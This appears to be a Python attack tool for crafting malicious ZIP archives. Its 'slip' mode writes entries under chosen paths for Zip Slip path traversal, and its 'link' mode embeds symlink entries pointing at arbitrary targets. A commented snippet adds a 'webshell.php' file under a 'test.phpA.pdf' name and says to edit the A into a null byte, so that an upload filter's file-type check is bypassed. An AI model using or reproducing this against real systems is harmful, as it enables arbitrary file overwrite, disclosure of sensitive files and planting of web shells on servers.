import zipfile
import sys


def create_zip_file(zip_file_name: str):
    return zipfile.ZipFile(zip_file_name, 'w', zipfile.ZIP_DEFLATED)


def add_and_keep_symbol_file_to_zip(zipfile_out: zipfile.ZipFile, link_name: str, link_target: str):
    # http://www.mail-archive.com/python-list@python.org/msg34223.html
    zipInfo = zipfile.ZipInfo(link_name)
    zipInfo.create_system = 3
    # long type of hex val of '0xA1ED0000L',
    # say, symlink attr magic...
    zipInfo.external_attr = 0xA1ED0000
    zipfile_out.writestr(zipInfo, link_target)
    pass

def add_file_to_zip(zipfile_out: zipfile.ZipFile, file_name: str, target_name: str):
    zipfile_out.write(file_name, target_name, zipfile.ZIP_DEFLATED)
    pass

def close_zip_file(zipfile_out: zipfile.ZipFile):
    zipfile_out.close()
    pass

def main_create_zip_keep_link():
    zip_name = sys.argv[2]
    print("Creating zip file: " + zip_name)
    zip_file = create_zip_file(zip_name)
    for i in range(3, len(sys.argv), 2):
        #add_file_to_zip(zip_file, sys.argv[i], sys.argv[i+1])
        link_name = sys.argv[i]
        link_target = sys.argv[i+1]
        print("Adding file: " + link_name + " as " + link_target)
        add_and_keep_symbol_file_to_zip(zip_file, link_name, link_target)
    print("zip file: " + zip_name + " created successfully")
    close_zip_file(zip_file)
    pass

def main_create_zip():
    zip_name = sys.argv[2]
    print("Creating zip file: " + zip_name)
    zip_file = create_zip_file(zip_name)
    for i in range(3, len(sys.argv), 2):
        link_name = sys.argv[i]
        link_target = sys.argv[i+1]
        print("Adding file: " + link_name + " as copy of real file " + link_target)
        add_file_to_zip(zip_file, link_name, link_target)
    print("zip file: " + zip_name + " created successfully")
    close_zip_file(zip_file)
    pass

'''
zip_file = create_zip_file("test.zip")
add_file_to_zip(zip_file, "webshell.php", "test.phpA.pdf")
close_zip_file(zip_file)
# edit the A as 00
'''

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: " + sys.argv[0] + " [slip|link] file_name file_name_in_zip [file_name file_name_in_zip] ...")
        exit(1)
    if sys.argv[1] == "slip":
        main_create_zip()
    elif sys.argv[1] == "link":
        main_create_zip_keep_link()
    else:
        print("Unknown option: " + sys.argv[1])
    pass